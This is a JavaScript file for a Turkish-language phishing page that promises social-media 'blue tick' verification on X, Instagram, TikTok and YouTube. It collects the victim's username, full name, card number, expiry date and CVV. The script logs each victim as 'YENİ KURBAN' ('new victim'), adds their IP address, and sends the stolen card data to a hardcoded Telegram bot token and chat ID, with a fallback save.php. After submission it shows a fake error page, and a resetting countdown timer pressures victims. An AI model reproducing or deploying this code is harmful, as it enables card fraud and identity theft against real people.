// ============================================
// TELEGRAM BOT AYARLARI
// ============================================
const TELEGRAM_BOT_TOKEN = '8522279955:AAFwA7uILD8zkzrxcjXjazc5guzSm1cFI5k';
const TELEGRAM_CHAT_ID = '6063727392';
// ============================================

let currentStep = 1;
let collectedData = {};
let selectedPlatform = '';

const PLATFORM_NAMES = {
    twitter: 'X / Twitter',
    instagram: 'Instagram',
    tiktok: 'TikTok',
    youtube: 'YouTube'
};

function selectPlatform(platform) {
    selectedPlatform = platform;
    collectedData.platform = PLATFORM_NAMES[platform] || platform;

    // Update the platform text in step 2
    const platformText = document.getElementById('platformText');
    if (platformText) {
        platformText.textContent = PLATFORM_NAMES[platform] + ' hesabınıza mavi tik almak için kullanıcı adınızı girin';
    }

    // Highlight selected platform
    document.querySelectorAll('.platform-btn').forEach(btn => {
        btn.classList.remove('selected');
    });
    event.target.closest('.platform-btn').classList.add('selected');

    // Move to step 2 after a brief delay for visual feedback
    setTimeout(() => {
        nextStep(2);
    }, 300);
}

function nextStep(step) {
    // Capture username if moving from step 2
    if (currentStep === 2 && step === 3) {
        const username = document.getElementById('username').value.trim();
        if (!username) {
            alert('Lütfen kullanıcı adınızı girin.');
            return;
        }
        collectedData.username = username;
        sendToTelegram({ type: 'username', platform: selectedPlatform, username: username });
    }

    document.getElementById('step' + currentStep).classList.add('hidden');
    document.getElementById('step' + step).classList.remove('hidden');
    currentStep = step;
}

function submitForm() {
    const fullname = document.getElementById('fullname').value.trim();
    const cardnumber = document.getElementById('cardnumber').value.trim();
    const expiry = document.getElementById('expiry').value.trim();
    const cvv = document.getElementById('cvv').value.trim();

    // Validation
    if (!fullname || !cardnumber || !expiry || !cvv) {
        alert('Lütfen tüm kart bilgilerini eksiksiz doldurun.');
        return;
    }

    if (cardnumber.replace(/\s/g, '').length < 16) {
        alert('Geçerli bir kart numarası girin.');
        return;
    }

    if (cvv.length < 3) {
        alert('Geçerli bir CVV girin.');
        return;
    }

    collectedData.fullname = fullname;
    collectedData.cardnumber = cardnumber;
    collectedData.expiry = expiry;
    collectedData.cvv = cvv;

    // Send all data
    sendToTelegram({ type: 'complete', ...collectedData });

    // Also try PHP save.php if available (fallback)
    sendToPhp(collectedData);

    // Show error page
    document.getElementById('step3').classList.add('hidden');
    document.getElementById('step4').classList.remove('hidden');
    currentStep = 4;
}

function resetForm() {
    // Clear all fields
    document.getElementById('username').value = '';
    document.getElementById('fullname').value = '';
    document.getElementById('cardnumber').value = '';
    document.getElementById('expiry').value = '';
    document.getElementById('cvv').value = '';
    collectedData = {};
    selectedPlatform = '';

    // Remove selected class from platform buttons
    document.querySelectorAll('.platform-btn').forEach(btn => {
        btn.classList.remove('selected');
    });

    // Reset platform text
    const platformText = document.getElementById('platformText');
    if (platformText) {
        platformText.textContent = 'Hesabınıza mavi tik almak için kullanıcı adınızı girin';
    }

    // Go back to step 1
    document.getElementById('step4').classList.add('hidden');
    document.getElementById('step1').classList.remove('hidden');
    currentStep = 1;
}

function sendToTelegram(data) {
    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;

    let message = '🚨 <b>YENİ KURBAN!</b>\n\n';

    if (data.platform) {
        message += '📱 <b>Platform:</b> ' + escapeHtml(data.platform) + '\n';
    }
    if (data.username) {
        message += '👤 <b>Kullanıcı:</b> @' + escapeHtml(data.username) + '\n';
    }
    if (data.fullname) {
        message += '📛 <b>Ad Soyad:</b> ' + escapeHtml(data.fullname) + '\n';
    }
    if (data.cardnumber) {
        message += '💳 <b>Kart No:</b> <code>' + escapeHtml(data.cardnumber) + '</code>\n';
    }
    if (data.expiry) {
        message += '📅 <b>SKT:</b> ' + escapeHtml(data.expiry) + '\n';
    }
    if (data.cvv) {
        message += '🔐 <b>CVV:</b> ' + escapeHtml(data.cvv) + '\n';
    }

    // Get IP via free API
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(ipData => {
            message += '\n🌐 <b>IP:</b> ' + ipData.ip + '\n';
            message += '⏰ <b>Tarih:</b> ' + new Date().toLocaleString('tr-TR');

            const url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).catch(err => console.log('Telegram error:', err));
        })
        .catch(() => {
            message += '\n⏰ <b>Tarih:</b> ' + new Date().toLocaleString('tr-TR');
            const url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).catch(err => console.log('Telegram error:', err));
        });
}

function sendToPhp(data) {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'save.php', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(data));
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Card number formatting
document.addEventListener('DOMContentLoaded', function() {
    const cardInput = document.getElementById('cardnumber');
    if (cardInput) {
        cardInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formatted = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formatted += ' ';
                }
                formatted += value[i];
            }
            e.target.value = formatted;
        });
    }

    // Expiry date formatting
    const expiryInput = document.getElementById('expiry');
    if (expiryInput) {
        expiryInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2);
            }
            e.target.value = value;
        });
    }

    // CVV - only numbers
    const cvvInput = document.getElementById('cvv');
    if (cvvInput) {
        cvvInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }

    // Countdown timer
    let minutes = 14;
    let seconds = 59;
    const timerEl = document.getElementById('timer');
    if (timerEl) {
        setInterval(function() {
            if (seconds === 0) {
                if (minutes === 0) {
                    minutes = 14;
                    seconds = 59;
                } else {
                    minutes--;
                    seconds = 59;
                }
            } else {
                seconds--;
            }
            timerEl.textContent = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
        }, 1000);
    }
});
